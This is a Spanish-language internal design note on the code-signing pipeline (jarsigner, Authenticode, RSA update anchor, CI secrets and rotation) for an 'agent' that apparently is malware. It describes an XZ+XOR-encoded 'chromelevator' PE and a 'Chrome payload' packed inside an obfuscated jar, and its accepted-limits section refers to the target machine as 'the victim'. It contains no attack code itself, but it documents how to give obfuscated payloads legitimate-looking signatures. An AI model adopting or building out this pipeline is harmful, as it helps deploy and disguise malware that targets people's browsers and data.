# Firma estable (E1)

Estado: **implementado en build y CI**. El keystore real vive en secretos de CI,
nunca en el repo.

## Qué se firma y qué significa

| Artefacto | Firma | Qué prueba |
|---|---|---|
| `agent.jar` | JAR PKCS#7 (`jarsigner`, SHA-256, TSA RFC3161) | integridad del contenido y autor del certificado |
| PE auxiliares (`chromelevator_x64.exe`, lanzador si existe) | Authenticode (`osslsigncode` / `signtool`) | editor y sello de tiempo del binario |
| `update.json` | RSA-3072 con `update-public.pem` | ancla **distinta**: autorización de actualización |

El PE va XZ+XOR dentro del jar. `signPe` firma el `.exe` en claro antes de
codificarlo y `generateChromePayload` escribe el hash firmado en el sidecar que
lee `Abe`. El release instala `osslsigncode`, firma y verifica; un PE sin firma
rompe el job. En el runner Windows la comprobación equivalente es
`Get-AuthenticodeSignature` = `Valid`.

**Un JAR no es Authenticode.** Windows no valida la firma JAR al ejecutar
`javaw -jar`; el arranque depende del hash canónico del stager y de la firma
JAR solo como prueba forense/integridad. La RSA de update es un ancla separada:
firmar un JAR no autoriza una actualización y viceversa.

## Custodia

- `SPC_AGENT_P12_B64`: PKCS#12 estable, base64, secreto de entorno de release.
- `SPC_AGENT_P12_PASS`, `SPC_AGENT_ALIAS`.
- `SPC_TSA_URL`: TSA RFC3161 primaria; `SPC_TSA_FALLBACK` para reintento manual
  del workflow. Un release falla sin TSA.
- El SHA-256 del certificado público y la fecha de caducidad se publican aquí y
  se revisan en cada rotación. El job avisa a 60 días y falla si caducó.
- Rotación: generar PKCS#12 nuevo, solapar 30 días, publicar el SHA-256 nuevo,
  re-firmar el release siguiente y retirar el anterior.

## Build local

Sin secretos se genera un PKCS#12 efímero y se firma igual; es válido para
pruebas, no para release. `./gradlew release` en CI usa
`-PrequireSignature`, que exige keystore, `SPC_PE_P12` y TSA, y verifica
`jar verified` + `timestamp` y la firma Authenticode del PE.
`-PnoObfuscate` sirve para diagnóstico, conserva el nombre `agent.jar` y no
cambia la firma.

## Verificación Windows

```powershell
jarsigner -verify -verbose .\agent.jar | Select-String 'jar verified','timestamp'
Get-AuthenticodeSignature .\chromelevator_x64.exe | Select-Object Status,SignerCertificate
```

`Status` debe ser `Valid`. Un PE sin firma o un JAR sin sello no se publica.

## Límites aceptados

- La clave privada de firma no está en la víctima; un administrador puede
  extraer el `build_secret` del jar en ejecución (riesgo ya aceptado).
- Revocar un certificado no desinstala agentes: solo cambia la confianza que un
  analista deposita en el binario.
